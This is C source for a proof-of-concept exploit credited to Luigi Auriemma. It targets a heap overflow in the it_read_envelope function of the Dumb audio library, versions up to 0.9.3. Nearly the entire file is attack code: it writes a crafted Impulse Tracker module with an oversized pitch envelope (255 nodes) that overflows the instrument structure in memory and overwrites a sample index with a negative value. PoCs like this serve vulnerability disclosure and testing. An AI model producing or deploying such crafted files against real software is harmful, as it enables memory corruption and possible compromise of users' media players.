/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;



#define VER         &quot;0.1&quot;
#define BOF         255     // 25 &lt; BOF &lt; 256
#define INSTRSZ     371
#define POCNAME     &quot;proof-of-concept&quot;



void fwi08(FILE *fd, int num);
void fwi16(FILE *fd, int num);
void fwi32(FILE *fd, int num);
void fwb08(FILE *fd, int num);
void fwb16(FILE *fd, int num);
void fwb32(FILE *fd, int num);
void fwstr(FILE *fd, uint8_t *str);
void fwstx(FILE *fd, uint8_t *str, int size);
void fwmem(FILE *fd, uint8_t *data, int size);
int bits2num(uint8_t *bits);
void std_err(void);



#pragma pack(1)
typedef struct {
    uint8_t     sign[4];    // IMPM
    uint8_t     name[26];
    uint16_t    PHiligt;
    uint16_t    OrdNum;
    uint16_t    InsNum;
    uint16_t    SmpNum;
    uint16_t    PatNum;
    uint16_t    Cwtv;
    uint16_t    Cmwt;
    uint16_t    Flags;
    uint16_t    Special;
    uint8_t     GV;
    uint8_t     MV;
    uint8_t     IS;
    uint8_t     IT;
    uint8_t     Sep;
    uint8_t     PWD;
    uint16_t    MsgLgth;
    uint32_t    MsgOff;
    uint32_t    Reserved;
} it_t;

typedef struct {
    uint8_t     Flg;
    uint8_t     Num;
    uint8_t     LpB;
    uint8_t     LpE;
    uint8_t     SLB;
    uint8_t     SLE;
//    int8_t      node_y[25];
//    uint16_t    node_t[25];
} it_env_t;

typedef struct {
    uint8_t     sign[4];    // IMPI
    uint8_t     filename[13];
    uint8_t     NNA;
    uint8_t     DCT;
    uint8_t     DCA;
    uint16_t    FadeOut;
    uint8_t     PPS;
    uint8_t     PPC;
    uint8_t     GbV;
    uint8_t     DfP;
    uint8_t     RV;
    uint8_t     RP;
    uint16_t    TrkVers;
    uint16_t    NoS;
    uint8_t     insname[26];
    uint8_t     IFC;
    uint8_t     IFR;
    uint8_t     MCh;
    uint8_t     MPr;
    uint16_t    MIDIBnk;
    uint8_t     nsample[120];
    uint8_t     ktable[120];
} it_ins_t;
#pragma pack()



int main(int argc, char *argv[]) {
    FILE    *fd;
    it_t    it;
    it_ins_t    it_ins;
    it_env_t    it_env;
    int     i,
            off;
    char    *fname;

    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Dumb &lt;= 0.9.3 (CVS 16 Jul 2006) heap overflow in it_read_envelope &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@autistici.org\n&quot;
        &quot;web:    aluigi.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;output_file.IT&gt;\n&quot;
            &quot;\n&quot;
            &quot;Note: this proof-of-concept is not optimized, it gives only an idea of the bug\n&quot;
            &quot;\n&quot;, argv[0]);
        exit(1);
    }

    fname = argv[1];

    printf(&quot;- create file %s\n&quot;, fname);
    fd = fopen(fname, &quot;wb&quot;);
    if(!fd) std_err();

    memset(&amp;it, 0, sizeof(it));
    memcpy(it.sign, &quot;IMPM&quot;, 4);
    strncpy(it.name, POCNAME, sizeof(it.name));
    it.Cmwt   = 0x200;
    it.OrdNum = 1;                              // required
    it.InsNum = 1;                              // envelope is read here

    off =
        sizeof(it) +
        64 +
        64 +
        (it.OrdNum * 1) +
        (it.InsNum * 4) +
        (it.SmpNum * 4) +
        (it.PatNum * 4);

    for(i = 0; i &lt; off; i++) fputc(0, fd);      // create needed space

        /* it_read_instrument */

    memset(&amp;it_ins, 0, sizeof(it_ins));
    memcpy(it_ins.sign, &quot;IMPI&quot;, 4);
    strncpy(it_ins.filename, POCNAME, sizeof(it_ins.filename));
    strncpy(it_ins.insname,  POCNAME, sizeof(it_ins.insname));

    fwrite(&amp;it_ins, sizeof(it_ins), 1, fd);

        /* it_read_envelope */

    memset(&amp;it_env, 0, sizeof(it_env));

        /* instrument-&gt;volume_envelope */

    it_env.Num = 25;
    fwrite(&amp;it_env, sizeof(it_env), 1, fd);
    for(i = 0; i &lt; it_env.Num; i++) {
        fwi08(fd, 0x61);                        // envelope-&gt;node_y[i]
        fwi16(fd, 0x6161);                      // envelope-&gt;node_t[i]
    }
    for(i = 75 - (it_env.Num * 3) + 1; i; i--) {
        fwi08(fd, 0);                           // 75 - envelope-&gt;n_nodes * 3 + 1
    }

        /* instrument-&gt;pan_envelope */

    it_env.Num = 25;
    fwrite(&amp;it_env, sizeof(it_env), 1, fd);
    for(i = 0; i &lt; it_env.Num; i++) {
        fwi08(fd, 0x62);                        // envelope-&gt;node_y[i]
        fwi16(fd, 0x6262);                      // envelope-&gt;node_t[i]
    }
    for(i = 75 - (it_env.Num * 3) + 1; i; i--) {
        fwi08(fd, 0);                           // 75 - envelope-&gt;n_nodes * 3 + 1
    }

        /* instrument-&gt;pitch_envelope */

    it_env.Num = BOF;
    fwrite(&amp;it_env, sizeof(it_env), 1, fd);
    for(i = 0; i &lt; it_env.Num; i++) {
        fwi08(fd, 0xff);                        // envelope-&gt;node_y[i]
        fwi16(fd, 0xffff);                      // envelope-&gt;node_t[i]
    }
    /* 0xff is used for overwriting sampfirst with a negative value! */
    /* m = component[n].sampfirst;                                   */
    /* Note: this PoC is not optimized                               */

    printf(
        &quot;- the IT_INSTRUMENT structure will be overflowed:\n&quot;
        &quot;  there are %d bytes from the end of pitch_envelope to the end of map_sample\n&quot;
        &quot;  while %d bytes will be written by this proof-of-concept\n&quot;,
        INSTRSZ,
        ((BOF - 25) * sizeof(unsigned short)) + INSTRSZ);

        /* it_load_sigdata */

    fseek(fd, 0, SEEK_SET);

    fwrite(&amp;it, sizeof(it), 1, fd);

    for(i = 0; i &lt; 64; i++) fwi08(fd, 0);       // sigdata-&gt;channel_pan
    for(i = 0; i &lt; 64; i++) fwi08(fd, 0);       // sigdata-&gt;channel_volume

    for(i = 0; i &lt; it.OrdNum; i++) {
        fwi08(fd, 255);                         // sigdata-&gt;order
    }                                           // 255 for found_some = 0 or will SIGFPE
    for(i = 0; i &lt; it.InsNum; i++) {
        fwi32(fd, off);                         // component[n_components].offset
    }
//    for(i = 0; i &lt; it.SmpNum;  i++) fwi32(fd, off);
//    for(i = 0; i &lt; it.PatNum;  i++) fwi32(fd, off);
//    for(i = 0; i &lt; it.MsgLgth; i++) fwi08(fd, &#039;a&#039;);

    fclose(fd);
    printf(&quot;- finished\n&quot;);
    return(0);
}



void fwi08(FILE *fd, int num) {
    fputc((num      ) &amp; 0xff, fd);
}



void fwi16(FILE *fd, int num) {
    fputc((num      ) &amp; 0xff, fd);
    fputc((num &gt;&gt;  8) &amp; 0xff, fd);
}



void fwi32(FILE *fd, int num) {
    fputc((num      ) &amp; 0xff, fd);
    fputc((num &gt;&gt;  8) &amp; 0xff, fd);
    fputc((num &gt;&gt; 16) &amp; 0xff, fd);
    fputc((num &gt;&gt; 24) &amp; 0xff, fd);
}



void fwb08(FILE *fd, int num) {
    fputc((num      ) &amp; 0xff, fd);
}



void fwb16(FILE *fd, int num) {
    fputc((num &gt;&gt;  8) &amp; 0xff, fd);
    fputc((num      ) &amp; 0xff, fd);
}



void fwb32(FILE *fd, int num) {
    fputc((num &gt;&gt; 24) &amp; 0xff, fd);
    fputc((num &gt;&gt; 16) &amp; 0xff, fd);
    fputc((num &gt;&gt;  8) &amp; 0xff, fd);
    fputc((num      ) &amp; 0xff, fd);
}



void fwstr(FILE *fd, uint8_t *str) {
    fputs(str, fd);
}



void fwstx(FILE *fd, uint8_t *str, int size) {
    int     i;

    for(i = 0; str[i] &amp;&amp; (i &lt; size); i++) {
        fputc(str[i], fd);
    }
    for(; i &lt; size; i++) {
        fputc(0, fd);
    }
}



void fwmem(FILE *fd, uint8_t *data, int size) {
    fwrite(data, size, 1, fd);
}



int bits2num(uint8_t *bits) {
    int     i,
            out = 0;

    for(i = 0; i &lt; 32; i++) {
        if(bits[i] == &#039;1&#039;) {
            out = (out &lt;&lt; 1) | 1;
        } else if(bits[i] == &#039;0&#039;) {
            out &lt;&lt;= 1;
        } else {
            break;
        }
    }
    return(out);
}



void std_err(void) {
    perror(&quot;\nError&quot;);
    exit(1);
}
